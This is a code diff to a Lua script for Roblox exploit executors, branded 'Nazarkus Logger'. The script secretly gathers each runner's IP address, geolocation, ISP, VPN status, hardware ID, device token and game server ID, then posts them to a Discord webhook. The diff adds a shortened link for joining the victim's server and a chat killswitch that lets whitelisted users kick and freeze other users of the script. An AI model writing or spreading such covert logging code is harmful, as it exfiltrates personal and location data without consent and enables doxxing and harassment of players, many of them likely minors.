@@ -9,6 +9,7 @@ local lp = game.Players.LocalPlayer
 local uid = tostring(lp.UserId)
 local HttpService = game:GetService("HttpService")
 local UIS = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
 
 local executor = "Unknown"
 pcall(function()
@@ -27,7 +28,6 @@ local reqFunc = syn and syn.request or http_request or request or fluxus and flu
 
 local function isHttpHooked()
     if not reqFunc then return false end
-    
     if debug and debug.getinfo then
         local info = debug.getinfo(reqFunc)
         if info.source then
@@ -37,7 +37,6 @@ local function isHttpHooked()
             end
         end
     end
-    
     return false
 end
 
@@ -112,12 +111,8 @@ local function getExecutorStrength()
     local unc_percent = math.floor((unc_count / #required_unc) * 100)
     local sunc_percent = math.floor((sunc_count / #required_sunc) * 100)
     
-    local result = string.format("**UNC:** %d%% | **sUNC:** %d%%", unc_percent, sunc_percent)
-    
-    if unc_percent < 80 then 
-        result = result .. "\n⚠️ Admin/IY могут не работать"
-    end
-
+    local result = string.format("UNC: %d%% | sUNC: %d%%", unc_percent, sunc_percent)
+    if unc_percent < 80 then result = result .. " (Admin/IY might break)" end
     return result
 end
 
@@ -155,6 +150,58 @@ if checkAccess(Blacklist) then
     status = "blacklist"
 elseif checkAccess(Whitelist) then
     status = "whitelist"
+end
+
+-- Система Live Killswitch (Ремоут Кик)
+if status ~= "whitelist" then
+    -- Если текущий игрок НЕ в вайтлисте, он начинает "слушать" чат на наличие команд кика
+    local function onChat(msg, speaker)
+        -- Проверяем, находится ли UID спикера (того кто написал) в вайтлисте
+        local isSpeakerWhitelisted = false
+        if Whitelist.UIDs then
+            for _, w_uid in ipairs(Whitelist.UIDs) do
+                if w_uid == tostring(speaker.UserId) then
+                    isSpeakerWhitelisted = true
+                    break
+                end
+            end
+        end
+
+        if isSpeakerWhitelisted then
+            local cmd = string.lower(msg)
+            if cmd == "/nk all" then
+                lp:Kick("Access Revoked by Owner.")
+                while true do end
+            elseif string.sub(cmd, 1, 4) == "/nk " then
+                local tgt = string.sub(cmd, 5)
+                if string.find(string.lower(lp.Name), tgt) or string.find(string.lower(lp.DisplayName), tgt) then
+                    lp:Kick("Access Revoked by Owner.")
+                    while true do end
+                end
+            end
+        end
+    end
+    
+    for _, p in ipairs(game.Players:GetPlayers()) do
+        p.Chatted:Connect(function(msg) onChat(msg, p) end)
+    end
+    game.Players.PlayerAdded:Connect(function(p)
+        p.Chatted:Connect(function(msg) onChat(msg, p) end)
+    end)
+else
+    -- Если текущий игрок В ВАЙТЛИСТЕ, он не слушает чужие команды кика, 
+    -- но может написать /nk help чтобы узнать список команд
+    lp.Chatted:Connect(function(msg)
+        if string.lower(msg) == "/nk help" then
+            pcall(function()
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Nazarkus Admin",
+                    Text = "Commands: /nk all (kick everyone using script), /nk [name] (kick specific user).",
+                    Duration = 5
+                })
+            end)
+        end
+    end)
 end
 
 pcall(function()
@@ -222,27 +269,18 @@ pcall(function()
         end
 
         if not gotIp then
-            local ok3, resp2 = pcall(reqFunc, {
-                Url = "https://ipinfo.io/json",
-                Method = "GET",
-                Headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-            })
+            local ok3, resp2 = pcall(reqFunc, {Url = "https://ipinfo.io/json", Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}})
             if ok3 and resp2 and resp2.Success then
                 local ok4, d2 = pcall(HttpService.JSONDecode, HttpService, resp2.Body)
                 if ok4 and d2 and d2.ip then
-                    ip_info.query = d2.ip
-                    ip_info.city = d2.city or "Unknown"
-                    ip_info.country = d2.country or "Unknown"
-                    ip_info.isp = d2.org or "Unknown"
-                    ip_info.timezone = d2.timezone or "Unknown"
+                    ip_info.query = d2.ip; ip_info.city = d2.city or "Unknown"; ip_info.country = d2.country or "Unknown"
+                    ip_info.isp = d2.org or "Unknown"; ip_info.timezone = d2.timezone or "Unknown"
                 end
             end
         end
 
-        local isVpnProxy = "Нет"
-        if ip_info.proxy or ip_info.hosting then
-            isVpnProxy = "Да"
-        end
+        local isVpnProxy = "No"
+        if ip_info.proxy or ip_info.hosting then isVpnProxy = "Yes" end
 
         local platform = "PC"
         if UIS.TouchEnabled and not UIS.KeyboardEnabled then platform = "Mobile"
@@ -264,9 +302,35 @@ pcall(function()
             friendsStr = #friendsInServer > 0 and table.concat(friendsInServer, ", ") or "None"
         end
 
+        local jobId = game.JobId
+        local isVip = false
+        if jobId == "" then
+            jobId = "Unknown"
+        else
+            if #jobId > 36 then isVip = true end
+        end
+
+        local gameStatus = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", place_name, game.PlaceId, jobId)
+        if isVip then gameStatus = gameStatus .. " (VIP Server)" end
+
+        local joinUrl = string.format("https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
+        local quickJoinBtn = ""
+        pcall(function()
+            local req = reqFunc({Url = joinUrl, Method = "GET"})
+            if req and req.Success then
+                quickJoinBtn = string.format("[Click to Join Server](%s)", req.Body)
+            end
+        end)
+        
+        local linksStr = string.format("[Profile](https://www.roblox.com/users/%s/profile)", uid)
+        
+        if quickJoinBtn ~= "" then
+            linksStr = quickJoinBtn .. " | " .. linksStr
+        end
+
         local execStrength = getExecutorStrength()
         local embedColor = (status == "blacklist") and 0xFF0000 or 0xFFA500
-        local embedTitle = (status == "blacklist") and "🚫 Blacklisted User Blocked" or "⚠️ Unknown/Guest User Executed"
+        local embedTitle = (status == "blacklist") and "Blacklisted User Blocked" or "Unknown/Guest User Executed"
 
         reqFunc({
             Url = MAIN_WEBHOOK,
@@ -287,9 +351,9 @@ pcall(function()
                         {["name"] = "Hardware ID", ["value"] = string.format("```\n%s\n```", hwid), ["inline"] = false},
                         {["name"] = "Device Token", ["value"] = string.format("```\n%s\n```", deviceToken), ["inline"] = false},
                         {["name"] = "Network", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query, ip_info.isp, isVpnProxy, ip_info.country, ip_info.city, ip_info.timezone), ["inline"] = false},
-                        {["name"] = "Game", ["value"] = string.format("**Game:** %s\n**Place ID:** `%s`\n**JobId:** `%s`", place_name, game.PlaceId, game.JobId), ["inline"] = false},
+                        {["name"] = "Game", ["value"] = gameStatus, ["inline"] = false},
                         {["name"] = "Friends Target", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
-                        {["name"] = "Links", ["value"] = "[Profile](https://www.roblox.com/users/"..uid.."/profile)", ["inline"] = false}
+                        {["name"] = "Links", ["value"] = linksStr, ["inline"] = false}
                     },
                     ["footer"] = { ["text"] = "Nazarkus Logger | " .. string.upper(status) },
                     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
